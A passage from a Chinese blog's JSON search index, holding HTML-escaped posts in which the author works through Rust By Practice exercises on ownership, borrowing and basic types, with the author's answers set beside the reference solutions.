&amp;names[1];&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习3 所有权和借用","slug":"Rust学习-练习3-所有权和借用","date":"2023-08-31T13:52:30.000Z","updated":"2023-09-10T07:42:50.171Z","comments":true,"path":"2023/08/31/Rust学习-练习3-所有权和借用/","link":"","permalink":"http://example.com/2023/08/31/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A03-%E6%89%80%E6%9C%89%E6%9D%83%E5%92%8C%E5%80%9F%E7%94%A8/","excerpt":"所有权和借用 - Rust By Practice( Rust 练习实践 ) 所有权 🌟🌟 123456fn main() &#123; // 使用尽可能多的方法来通过编译 let x = String::from(&quot;hello, world&quot;); let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; My Answer 123456fn main() &#123; // 使用尽可能多的方法来通过编译 let x: &amp;str = &quot;hello,world&quot;; let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 123456fn main() &#123; // 使用尽可能多的方法来通过编译 let x = String::from(&quot;hello, world&quot;); let y = x.clone(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; Answer 12345fn main() &#123; let x = String::from(&quot;hello, world&quot;); let y = x.clone(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 12345fn main() &#123; let x = &quot;hello, world&quot;; let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 12345fn main() &#123; let x = &amp;String::from(&quot;hello, world&quot;); let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 12345fn main() &#123; let x = String::from(&quot;hello, world&quot;); let y = x.as_str(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 🌟🌟 123456789101112// 不要修改 main 中的代码fn main() &#123; let s1 = String::from(&quot;hello, world&quot;); let s2 = take_ownership(s1); println!(&quot;&#123;&#125;&quot;, s2);&#125;// 只能修改下面的代码!fn take_ownership(s: String) &#123; println!(&quot;&#123;&#125;&quot;, s);&#125; My Answer 12345678910111213// 不要修改 main 中的代码fn main() &#123; let s1 = String::from(&quot;hello, world&quot;); let s2 = take_ownership(s1); println!(&quot;&#123;&#125;&quot;, s2);&#125;// 只能修改下面的代码!fn take_ownership(s: String) -&gt;String&#123; println!(&quot;&#123;&#125;&quot;, s); s&#125; Answer 12345678910111213// Don&#x27;t modify code in main!fn main() &#123; let s1 = String::from(&quot;hello, world&quot;); let s2 = take_ownership(s1); println!(&quot;&#123;&#125;&quot;, s2);&#125;// Only modify the code below!fn take_ownership(s: String) -&gt; String &#123; println!(&quot;&#123;&#125;&quot;, s); s&#125; 🌟🌟 12345678910111213fn main() &#123; let s = give_ownership(); println!(&quot;&#123;&#125;&quot;, s);&#125;// 只能修改下面的代码!fn give_ownership() -&gt; String &#123; let s = String::from(&quot;hello, world&quot;); // convert String to Vec // 将 String 转换成 Vec 类型 let _s = s.into_bytes(); s&#125; My Answer 不会 Answer 123456789101112fn main() &#123; let s = give_ownership(); println!(&quot;&#123;&#125;&quot;, s);&#125;// Only modify the code below!fn give_ownership() -&gt; String &#123; let s = String::from(&quot;hello, world&quot;); // convert String to Vec let _s = s.as_bytes(); s&#125; 12345678910fn main() &#123; let s = give_ownership(); println!(&quot;&#123;&#125;&quot;, s);&#125;// Only modify the code below!fn give_ownership() -&gt; String &#123; let s = String::from(&quot;hello, world&quot;); s&#125; 🌟🌟 123456789101112// 修复错误，不要删除任何代码行fn main() &#123; let s = String::from(&quot;hello, world&quot;); print_str(s); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; My Answer 12345678910111213// 修复错误，不要删除任何代码行fn main() &#123; let s = String::from(&quot;hello, world&quot;); let s = print_str(s); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: String) -&gt; String &#123; println!(&quot;&#123;&#125;&quot;,s); s&#125; Answer 1234567891011fn main() &#123; let s = String::from(&quot;hello, world&quot;); print_str(s.clone()); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; 12345678fn main() &#123; let s = String::from(&quot;hello, world&quot;); print_str(&amp;s); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: &amp;String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; 🌟🌟 123456// 不要使用 clone，使用 copy 的方式替代fn main() &#123; let x = (1, 2, (), &quot;hello&quot;.to_string()); let y = x.clone(); println!(&quot;&#123;:?&#125;, &#123;:?&#125;&quot;, x, y);&#125; My Answer 123456// 不要使用 clone，使用 copy 的方式替代fn main() &#123; let x = (1, 2, (), &quot;hello&quot;); let y = x; println!(&quot;&#123;:?&#125;, &#123;:?&#125;&quot;, x, y);&#125; Answer 12345fn main() &#123; let x = (1, 2, (), &quot;hello&quot;); let y = x; println!(&quot;&#123;:?&#125;, &#123;:?&#125;&quot;, x, y);&#125;","text":"所有权和借用 - Rust By Practice( Rust 练习实践 ) 所有权 🌟🌟 123456fn main() &#123; // 使用尽可能多的方法来通过编译 let x = String::from(&quot;hello, world&quot;); let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; My Answer 123456fn main() &#123; // 使用尽可能多的方法来通过编译 let x: &amp;str = &quot;hello,world&quot;; let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 123456fn main() &#123; // 使用尽可能多的方法来通过编译 let x = String::from(&quot;hello, world&quot;); let y = x.clone(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; Answer 12345fn main() &#123; let x = String::from(&quot;hello, world&quot;); let y = x.clone(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 12345fn main() &#123; let x = &quot;hello, world&quot;; let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 12345fn main() &#123; let x = &amp;String::from(&quot;hello, world&quot;); let y = x; println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 12345fn main() &#123; let x = String::from(&quot;hello, world&quot;); let y = x.as_str(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,x,y);&#125; 🌟🌟 123456789101112// 不要修改 main 中的代码fn main() &#123; let s1 = String::from(&quot;hello, world&quot;); let s2 = take_ownership(s1); println!(&quot;&#123;&#125;&quot;, s2);&#125;// 只能修改下面的代码!fn take_ownership(s: String) &#123; println!(&quot;&#123;&#125;&quot;, s);&#125; My Answer 12345678910111213// 不要修改 main 中的代码fn main() &#123; let s1 = String::from(&quot;hello, world&quot;); let s2 = take_ownership(s1); println!(&quot;&#123;&#125;&quot;, s2);&#125;// 只能修改下面的代码!fn take_ownership(s: String) -&gt;String&#123; println!(&quot;&#123;&#125;&quot;, s); s&#125; Answer 12345678910111213// Don&#x27;t modify code in main!fn main() &#123; let s1 = String::from(&quot;hello, world&quot;); let s2 = take_ownership(s1); println!(&quot;&#123;&#125;&quot;, s2);&#125;// Only modify the code below!fn take_ownership(s: String) -&gt; String &#123; println!(&quot;&#123;&#125;&quot;, s); s&#125; 🌟🌟 12345678910111213fn main() &#123; let s = give_ownership(); println!(&quot;&#123;&#125;&quot;, s);&#125;// 只能修改下面的代码!fn give_ownership() -&gt; String &#123; let s = String::from(&quot;hello, world&quot;); // convert String to Vec // 将 String 转换成 Vec 类型 let _s = s.into_bytes(); s&#125; My Answer 不会 Answer 123456789101112fn main() &#123; let s = give_ownership(); println!(&quot;&#123;&#125;&quot;, s);&#125;// Only modify the code below!fn give_ownership() -&gt; String &#123; let s = String::from(&quot;hello, world&quot;); // convert String to Vec let _s = s.as_bytes(); s&#125; 12345678910fn main() &#123; let s = give_ownership(); println!(&quot;&#123;&#125;&quot;, s);&#125;// Only modify the code below!fn give_ownership() -&gt; String &#123; let s = String::from(&quot;hello, world&quot;); s&#125; 🌟🌟 123456789101112// 修复错误，不要删除任何代码行fn main() &#123; let s = String::from(&quot;hello, world&quot;); print_str(s); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; My Answer 12345678910111213// 修复错误，不要删除任何代码行fn main() &#123; let s = String::from(&quot;hello, world&quot;); let s = print_str(s); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: String) -&gt; String &#123; println!(&quot;&#123;&#125;&quot;,s); s&#125; Answer 1234567891011fn main() &#123; let s = String::from(&quot;hello, world&quot;); print_str(s.clone()); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; 12345678fn main() &#123; let s = String::from(&quot;hello, world&quot;); print_str(&amp;s); println!(&quot;&#123;&#125;&quot;, s);&#125;fn print_str(s: &amp;String) &#123; println!(&quot;&#123;&#125;&quot;,s)&#125; 🌟🌟 123456// 不要使用 clone，使用 copy 的方式替代fn main() &#123; let x = (1, 2, (), &quot;hello&quot;.to_string()); let y = x.clone(); println!(&quot;&#123;:?&#125;, &#123;:?&#125;&quot;, x, y);&#125; My Answer 123456// 不要使用 clone，使用 copy 的方式替代fn main() &#123; let x = (1, 2, (), &quot;hello&quot;); let y = x; println!(&quot;&#123;:?&#125;, &#123;:?&#125;&quot;, x, y);&#125; Answer 12345fn main() &#123; let x = (1, 2, (), &quot;hello&quot;); let y = x; println!(&quot;&#123;:?&#125;, &#123;:?&#125;&quot;, x, y);&#125; 可变性当所有权转移时，可变性也可以随之改变。 🌟 12345678fn main() &#123; let s = String::from(&quot;hello, &quot;); // 只修改下面这行代码 ! let s1 = s; s1.push_str(&quot;world&quot;)&#125; My Answer 12345678fn main() &#123; let s = String::from(&quot;hello, &quot;); // 只修改下面这行代码 ! let mut s1 = s; s1.push_str(&quot;world&quot;)&#125; Answer 12345678fn main() &#123; let s = String::from(&quot;hello, &quot;); // modify this line only ! let mut s1 = s; s1.push_str(&quot;world&quot;)&#125; 🌟🌟🌟 123456789fn main() &#123; let x = Box::new(5); let ... // 完成该行代码，不要修改其它行！ *y = 4; assert_eq!(*x, 5);&#125; My Answer 123456789fn main() &#123; let x = Box::new(5); let mut y = Box::new(1); // 完成该行代码，不要修改其它行！ *y = 4; assert_eq!(*x, 5);&#125; Answer 123456789fn main() &#123; let x = Box::new(5); let mut y = Box::new(3); // implement this line, dont change other lines! *y = 4; assert_eq!(*x, 5);&#125; 部分move当解构一个变量时，可以同时使用 move 和引用模式绑定的方式。当这么做时，部分 move 就会发生：变量中一部分的所有权被转移给其它变量，而另一部分我们获取了它的引用。 在这种情况下，原变量将无法再被使用，但是它没有转移所有权的那一部分依然可以使用，也就是之前被引用的那部分。 示例1234567891011121314151617181920212223242526fn main() &#123; #[derive(Debug)] struct Person &#123; name: String, age: Box&lt;u8&gt;, &#125; let person = Person &#123; name: String::from(&quot;Alice&quot;), age: Box::new(20), &#125;; // 通过这种解构式模式匹配，person.name 的所有权被转移给新的变量 `name` // 但是，这里 `age` 变量却是对 person.age 的引用, 这里 ref 的使用相当于: let age = &amp;person.age let Person &#123; name, ref age &#125; = person; println!(&quot;The person&#x27;s age is &#123;&#125;&quot;, age); println!(&quot;The person&#x27;s name is &#123;&#125;&quot;, name); // Error! 原因是 person 的一部分已经被转移了所有权，因此我们无法再使用它 //println!(&quot;The person struct is &#123;:?&#125;&quot;, person); // 虽然 `person` 作为一个整体无法再被使用，但是 `person.age` 依然可以使用 println!(&quot;The person&#x27;s age from person struct is &#123;&#125;&quot;, person.age);&#125; 练习 🌟 12345678fn main() &#123; let t = (String::from(&quot;hello&quot;), String::from(&quot;world&quot;)); let _s = t.0; // 仅修改下面这行代码，且不要使用 `_s` println!(&quot;&#123;:?&#125;&quot;, t);&#125; My Answer 12345678fn main() &#123; let t = (String::from(&quot;hello&quot;), String::from(&quot;world&quot;)); let _s = t.0; // 仅修改下面这行代码，且不要使用 `_s` println!(&quot;&#123;:?&#125;&quot;, t.1);&#125; Answer 12345678fn main() &#123; let t = (String::from(&quot;hello&quot;), String::from(&quot;world&quot;)); let _s = t.0; // modify this line only, don&#x27;t use `_s` println!(&quot;&#123;:?&#125;&quot;, t.1); &#125; 🌟🌟 12345678fn main() &#123; let t = (String::from(&quot;hello&quot;), String::from(&quot;world&quot;)); // 填空，不要修改其它代码 let (__, __) = __; println!(&quot;&#123;:?&#125;, &#123;:?&#125;, &#123;:?&#125;&quot;, s1, s2, t); // -&gt; &quot;hello&quot;, &quot;world&quot;, (&quot;hello&quot;, &quot;world&quot;)&#125; My Answer 12345678fn main() &#123; let t = (String::from(&quot;hello&quot;), String::from(&quot;world&quot;)); // 填空，不要修改其它代码 let (s1, s2) = t.clone(); println!(&quot;&#123;:?&#125;, &#123;:?&#125;, &#123;:?&#125;&quot;, s1, s2, t); // -&gt; &quot;hello&quot;, &quot;world&quot;, (&quot;hello&quot;, &quot;world&quot;)&#125; Answer 12345678fn main() &#123; let t = (String::from(&quot;hello&quot;), String::from(&quot;world&quot;)); // fill the blanks let (s1, s2) = t.clone(); println!(&quot;&#123;:?&#125;, &#123;:?&#125;, &#123;:?&#125;&quot;, s1, s2, t); // -&gt; &quot;hello&quot;, &quot;world&quot;, (&quot;hello&quot;, &quot;world&quot;)&#125; 引用和借用引用 🌟 1234567fn main() &#123; let x = 5; // 填写空白处 let p = __; println!(&quot;x 的内存地址是 &#123;:p&#125;&quot;, p); // output: 0x16fa3ac84&#125; My Answer 1234567fn main() &#123; let x = 5; // 填写空白处 let p = &amp;x; println!(&quot;x 的内存地址是 &#123;:p&#125;&quot;, p); // output: 0x16fa3ac84&#125; Answer 1234567fn main() &#123; let x = 5; // fill the blank let p = &amp;x; println!(&quot;the memory address of x is &#123;:p&#125;&quot;, p); // one possible output: 0x16fa3ac84&#125; 🌟 1234567fn main() &#123; let x = 5; let y = &amp;x; // 只能修改以下行 assert_eq!(5, y);&#125; My Answer 1234567fn main() &#123; let x = 5; let y = &amp;x; // 只能修改以下行 assert_eq!(5, *y);&#125; Answer 1234567fn main() &#123; let x = 5; let y = &amp;x; // modify this line only assert_eq!(5, *y);&#125; 🌟 12345678// 修复错误fn main() &#123; let mut s = String::from(&quot;hello, &quot;); borrow_object(s)&#125;fn borrow_object(s: &amp;String) &#123;&#125; My Answer 12345678// 修复错误fn main() &#123; let mut s = String::from(&quot;hello, &quot;); borrow_object(&amp;s)&#125;fn borrow_object(s: &amp;String) &#123;&#125; Answer 1234567fn main() &#123; let mut s = String::from(&quot;hello, &quot;); borrow_object(&amp;s)&#125;fn borrow_object(s: &amp;String) &#123;&#125; 🌟 12345678910// 修复错误fn main() &#123; let mut s = String::from(&quot;hello, &quot;); push_str(s)&#125;fn push_str(s: &amp;mut String) &#123; s.push_str(&quot;world&quot;)&#125; My Answer 12345678910// 修复错误fn main() &#123; let mut s = String::from(&quot;hello, &quot;); push_str(&amp; mut s)&#125;fn push_str(s: &amp;mut String) &#123; s.push_str(&quot;world&quot;)&#125; Answer 123456789fn main() &#123; let mut s = String::from(&quot;hello, &quot;); push_str(&amp;mut s)&#125;fn push_str(s: &amp;mut String) &#123; s.push_str(&quot;world&quot;)&#125; 🌟🌟 12345678fn main() &#123; let mut s = String::from(&quot;hello, &quot;); // 填写空白处，让代码工作 let p = __; p.push_str(&quot;world&quot;);&#125; My Answer 12345678fn main() &#123; let mut s = String::from(&quot;hello, &quot;); // 填写空白处，让代码工作 let p = &amp;mut s; p.push_str(&quot;world&quot;);&#125; Answer 12345678fn main() &#123; let mut s = String::from(&quot;hello, &quot;); // fill the blank to make it work let p = &amp;mut s; p.push_str(&quot;world&quot;);&#125; refref 与 &amp; 类似，可以用来获取一个值的引用，但是它们的用法有所不同。 🌟🌟🌟 1234567891011121314151617fn main() &#123; let c = &#x27;中&#x27;; let r1 = &amp;c; // 填写空白处，但是不要修改其它行的代码 let __ r2 = c; assert_eq!(*r1, *r2); // 判断两个内存地址的字符串是否相等 assert_eq!(get_addr(r1),get_addr(r2));&#125;// 获取传入引用的内存地址的字符串形式fn get_addr(r: &amp;char) -&gt; String &#123; format!(&quot;&#123;:p&#125;&quot;, r)&#125; My Answer 1234567891011121314151617fn main() &#123; let c = &#x27;中&#x27;; let r1 = &amp;c; // 填写空白处，但是不要修改其它行的代码 let ref r2 = c; assert_eq!(*r1, *r2); // 判断两个内存地址的字符串是否相等 assert_eq!(get_addr(r1),get_addr(r2));&#125;// 获取传入引用的内存地址的字符串形式fn get_addr(r: &amp;char) -&gt; String &#123; format!(&quot;&#123;:p&#125;&quot;, r)&#125; Answer 1234567891011121314151617fn main() &#123; let c = &#x27;中&#x27;; let r1 = &amp;c; // fill the blank，dont change other code let ref r2 = c; assert_eq!(*r1, *r2); // check the equality of the two address strings assert_eq!(get_addr(r1),get_addr(r2));&#125;// get memory address stringfn get_addr(r: &amp;char) -&gt; String &#123; format!(&quot;&#123;:p&#125;&quot;, r)&#125; 借用规则 🌟 12345678910// 移除代码某个部分，让它工作// 你不能移除整行的代码！fn main() &#123; let mut s = String::from(&quot;hello&quot;); let r1 = &amp;mut s; let r2 = &amp;mut s; println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);&#125; My Answer 12345678910// 移除代码某个部分，让它工作// 你不能移除整行的代码！fn main() &#123; let mut s = String::from(&quot;hello&quot;); let r1 = &amp;s; let r2 = &amp;s; println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);&#125; Answer 12345678fn main() &#123; let s = String::from(&quot;hello&quot;); let r1 = &amp;s; let r2 = &amp;s; println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);&#125; 可变性 🌟 错误: 从不可变对象借用可变 12345678fn main() &#123; // 通过修改下面一行代码来修复错误 let s = String::from(&quot;hello, &quot;); borrow_object(&amp;mut s)&#125;fn borrow_object(s: &amp;mut String) &#123;&#125; My Answer 12345678fn main() &#123; // 通过修改下面一行代码来修复错误 let mut s = String::from(&quot;hello, &quot;); borrow_object(&amp;mut s)&#125;fn borrow_object(s: &amp;mut String) &#123;&#125; Answer 12345678fn main() &#123; //fix error by modifying this line let mut s = String::from(&quot;hello, &quot;); borrow_object(&amp;mut s)&#125;fn borrow_object(s: &amp;mut String) &#123;&#125; 🌟🌟 Ok: 从可变对象借用不可变 12345678910// 下面的代码没有任何错误fn main() &#123; let mut s = String::from(&quot;hello, &quot;); borrow_object(&amp;s); s.push_str(&quot;world&quot;);&#125;fn borrow_object(s: &amp;String) &#123;&#125; My Answer 12345678910// 下面的代码没有任何错误fn main() &#123; let mut s = String::from(&quot;hello, &quot;); borrow_object(&amp;s); s.push_str(&quot;world&quot;);&#125;fn borrow_object(s: &amp;String) &#123;&#125; NLL 🌟🌟 1234567891011// 注释掉一行代码让它工作fn main() &#123; let mut s = String::from(&quot;hello, &quot;); let r1 = &amp;mut s; r1.push_str(&quot;world&quot;); let r2 = &amp;mut s; r2.push_str(&quot;!&quot;); println!(&quot;&#123;&#125;&quot;,r1);&#125; My Answer 1234567891011// 注释掉一行代码让它工作fn main() &#123; let mut s = String::from(&quot;hello, &quot;); let r1 = &amp;mut s; r1.push_str(&quot;world&quot;); let r2 = &amp;mut s; r2.push_str(&quot;!&quot;); //println!(&quot;&#123;&#125;&quot;,r1);&#125; Answer 12345678910fn main() &#123; let mut s = String::from(&quot;hello, &quot;); let r1 = &amp;mut s; r1.push_str(&quot;world&quot;); let r2 = &amp;mut s; r2.push_str(&quot;!&quot;); // println!(&quot;&#123;&#125;&quot;,r1);&#125; 🌟🌟 123456789fn main() &#123; let mut s = String::from(&quot;hello, &quot;); let r1 = &amp;mut s; let r2 = &amp;mut s; // 在下面增加一行代码人为制造编译错误：cannot borrow `s` as mutable more than once at a time // 你不能同时使用 r1 和 r2&#125; My Answer 12345678910fn main() &#123; let mut s = String::from(&quot;hello, &quot;); let r1 = &amp;mut s; let r2 = &amp;mut s; // 在下面增加一行代码人为制造编译错误：cannot borrow `s` as mutable more than once at a time println!(&quot;&#123;&#125;&quot;,r1); // 你不能同时使用 r1 和 r2&#125; Answer 12345678910fn main() &#123; let mut s = String::from(&quot;hello, &quot;); let r1 = &amp;mut s; let r2 = &amp;mut s; // add one line below to make a compiler error: cannot borrow `s` as mutable more than once at a time // you can&#x27;t use r1 and r2 at the same time r1.push_str(&quot;world&quot;);&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习2 基本类型","slug":"Rust学习-练习2-基本类型","date":"2023-08-25T11:04:01.000Z","updated":"2023-09-10T07:42:50.997Z","comments":true,"path":"2023/08/25/Rust学习-练习2-基本类型/","link":"","permalink":"http://example.com/2023/08/25/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A02-%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/","excerpt":"基本类型 - Rust By Practice( Rust 练习实践 ) 数值类型整数","text":"基本类型 - Rust By Practice( Rust 练习实践 ) 数值类型整数 🌟 Tips: 如果我们没有显式的给予变量一个类型，那编译器会自动帮我们推导一个类型 123456789// 移除某个部分让代码工作fn main() &#123; let x: i32 = 5; let mut y: u32 = 5; y = x; let z = 10; // 这里 z 的类型是? &#125; My Answer 1234// 移除某个部分让代码工作fn main() &#123; let x: i32 = 5; let mut y: u32 = 5; let z = 10; // 这里 z 的类型是? } 1 Answer 12345678fn main() &#123; let x: i32 = 5; let mut y = 5; y = x; let z = 10; // type of z : i32&#125; 🌟 1234// 填空fn main() &#123; let v: u16 = 38_u8 as __;&#125; My Answer 1234// 填空fn main() &#123; let v: u16 = 38_u8 as u16;&#125; Answer 123fn main() &#123; let v: u16 = 38_u8 as u16;&#125; 🌟🌟🌟 Tips: 如果我们没有显式的给予变量一个类型，那编译器会自动帮我们推导一个类型 12345678910// 修改 `assert_eq!` 让代码工作fn main() &#123; let x = 5; assert_eq!(&quot;u32&quot;.to_string(), type_of(&amp;x));&#125;// 以下函数可以获取传入参数的类型，并返回类型的字符串形式，例如 &quot;i8&quot;, &quot;u8&quot;, &quot;i32&quot;, &quot;u32&quot;fn type_of&lt;T&gt;(_: &amp;T) -&gt; String &#123; format!(&quot;&#123;&#125;&quot;, std::any::type_name::&lt;T&gt;())&#125; My Answer 12345678910// 修改 `assert_eq!` 让代码工作fn main() &#123; let x = 5; assert_eq!(&quot;u32&quot;.to_string(), type_of(&amp;x));&#125;// 以下函数可以获取传入参数的类型，并返回类型的字符串形式，例如 &quot;i8&quot;, &quot;u8&quot;, &quot;i32&quot;, &quot;u32&quot;fn type_of&lt;T&gt;(_: &amp;T) -&gt; String &#123; format!(&quot;&#123;&#125;&quot;, std::any::type_name::&lt;T&gt;())&#125; Answer 123456789fn main() &#123; let x = 5; assert_eq!(&quot;i32&quot;.to_string(), type_of(&amp;x));&#125;// get the type of given variable, return a string representation of the type , e.g &quot;i8&quot;, &quot;u8&quot;, &quot;i32&quot;, &quot;u32&quot;fn type_of&lt;T&gt;(_: &amp;T) -&gt; String &#123; format!(&quot;&#123;&#125;&quot;, std::any::type_name::&lt;T&gt;())&#125; 🌟🌟 12345// 填空，让代码工作fn main() &#123; assert_eq!(i8::MAX, __); assert_eq!(u8::MAX, __); &#125; My Answer 12345// 填空，让代码工作fn main() &#123; assert_eq!(i8::MAX, 127); assert_eq!(u8::MAX, 255); &#125; Answer 1234fn main() &#123; assert_eq!(i8::MAX, 127); assert_eq!(u8::MAX, 255); &#125; 🌟🌟 123456// 解决代码中的错误和 `panic`fn main() &#123; let v1 = 251_u8 + 8; let v2 = i8::checked_add(251, 8).unwrap(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,v1,v2);&#125; My Answer 123456// 解决代码中的错误和 `panic`fn main() &#123; let v1 = 251_u16 + 8_u16; let v2 = u8::checked_add(251, 8).unwrap(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,v1,v2);&#125; Answer 12345fn main() &#123; let v1 = 247_u8 + 8; let v2 = i8::checked_add(119, 8).unwrap(); println!(&quot;&#123;&#125;,&#123;&#125;&quot;,v1,v2); &#125; 🌟🌟 1234 fn main() &#123; let v = 1_024 + 0xff + 0o77 + 0b1111_1111; assert!(v == 1597);&#125; My Answer 12345// 修改 `assert!` 让代码工作fn main() &#123; let v = 1_024 + 0xff + 0o77 + 0b1111_1111; assert!(v == 1597);&#125; Answer 12345// 修改 `assert!` 让代码工作fn main() &#123; let v = 1_024 + 0xff + 0o77 + 0b1111_1111; assert!(v == 1597);&#125; 浮点数 🌟 123456// 将 ? 替换成你的答案fn main() &#123; let x = 1_000.000_1; // ? let y: f32 = 0.12; // f32 let z = 0.01_f64; // f64&#125; My Answer 123456// 将 ? 替换成你的答案fn main() &#123; let x = 1_000.000_1; // f64 let y: f32 = 0.12; // f32 let z = 0.01_f64; // f64&#125; Answer 123456789101112fn main() &#123; let x = 1_000.000_1; // f64 let y: f32 = 0.12; // f32 let z = 0.01_f64; // f64 assert_eq!(type_of(&amp;x), &quot;f64&quot;.to_string()); println!(&quot;Success!&quot;);&#125;fn type_of&lt;T&gt;(_: &amp;T) -&gt; String &#123; format!(&quot;&#123;&#125;&quot;, std::any::type_name::&lt;T&gt;())&#125; 🌟🌟 使用两种方法来让下面代码工作 123fn main() &#123; assert!(0.1+0.2==0.3);&#125; My Answer 123fn main() &#123; assert!(0.1_f32+0.2_f32==0.3_f32);&#125; Answer 123fn main() &#123; assert!(0.1_f32+0.2_f32==0.3_f32);&#125; 123fn main() &#123; assert!((0.1_f64+ 0.2 - 0.3).abs() &lt; 0.001);&#125; 序列 🌟🌟 两个目标: 1. 修改 assert! 让它工作 2. 让 println! 输出: 97 - 122 123456789101112fn main() &#123; let mut sum = 0; for i in -3..2 &#123; sum += i &#125; assert!(sum == -3); for c in &#x27;a&#x27;..=&#x27;z&#x27; &#123; println!(&quot;&#123;&#125;&quot;,c); &#125;&#125; My Answer 123456789101112fn main() &#123; let mut sum = 0; for i in -3..2 &#123; sum += i &#125; assert!(sum == -5); for c in &#x27;a&#x27;..=&#x27;z&#x27; &#123; println!(&quot;&#123;&#125;&quot;,c as u8); &#125;&#125; Answer 123456789101112fn main() &#123; let mut sum = 0; for i in -3..2 &#123; sum += i &#125; assert!(sum == -5); for c in &#x27;a&#x27;..=&#x27;z&#x27; &#123; println!(&quot;&#123;&#125;&quot;,c as u8); &#125;&#125; 🌟🌟 123456// 填空use std::ops::&#123;Range, RangeInclusive&#125;;fn main() &#123; assert_eq!((1..__), Range&#123; start: 1, end: 5 &#125;); assert_eq!((1..__), RangeInclusive::new(1, 5));&#125; My Answer 123456// 填空use std::ops::&#123;Range, RangeInclusive&#125;;fn main() &#123; assert_eq!((1..5), Range&#123; start: 1, end: 5 &#125;); assert_eq!((1..=5), RangeInclusive::new(1, 5));&#125; Answer 123456// 填空use std::ops::&#123;Range, RangeInclusive&#125;;fn main() &#123; assert_eq!((1..5), Range&#123; start: 1, end: 5 &#125;); assert_eq!((1..=5), RangeInclusive::new(1, 5));&#125; 计算 🌟 123456789101112131415161718192021222324252627// 填空，并解决错误fn main() &#123; // 整数加法 assert!(1u32 + 2 == __); // 整数减法 assert!(1i32 - 2 == __); assert!(1u8 - 2 == -1); assert!(3 * 50 == __); assert!(9.6 / 3.2 == 3.0); // error ! 修改它让代码工作 assert!(24 % 5 == __); // 逻辑与或非操作 assert!(true &amp;&amp; false == __); assert!(true || false == __); assert!(!true == __); // 位操作 println!(&quot;0011 AND 0101 is &#123;:04b&#125;&quot;, 0b0011u32 &amp; 0b0101); println!(&quot;0011 OR 0101 is &#123;:04b&#125;&quot;, 0b0011u32 | 0b0101); println!(&quot;0011 XOR 0101 is &#123;:04b&#125;&quot;, 0b0011u32 ^ 0b0101); println!(&quot;1 &lt;&lt; 5 is &#123;&#125;&quot;, 1u32 &lt;&lt; 5); println!(&quot;0x80 &gt;&gt; 2 is 0x&#123;:x&#125;&quot;, 0x80u32 &gt;&gt; 2);&#125; My Answer 123456789101112131415161718192021222324252627// 填空，并解决错误fn main() &#123; // 整数加法 assert!(1u32 + 2 == 3); // 整数减法 assert!(1i32 - 2 == -1); assert!(1i8 - 2 == -1); assert!(3 * 50 == 150); assert!(9 / 3 == 3); // error ! 修改它让代码工作 assert!(24 % 5 == 4); // 逻辑与或非操作 assert!(true &amp;&amp; false == false); assert!(true || false == true); assert!(!true == false); // 位操作 println!(&quot;0011 AND 0101 is &#123;:04b&#125;&quot;, 0b0011u32 &amp; 0b0101); println!(&quot;0011 OR 0101 is &#123;:04b&#125;&quot;, 0b0011u32 | 0b0101); println!(&quot;0011 XOR 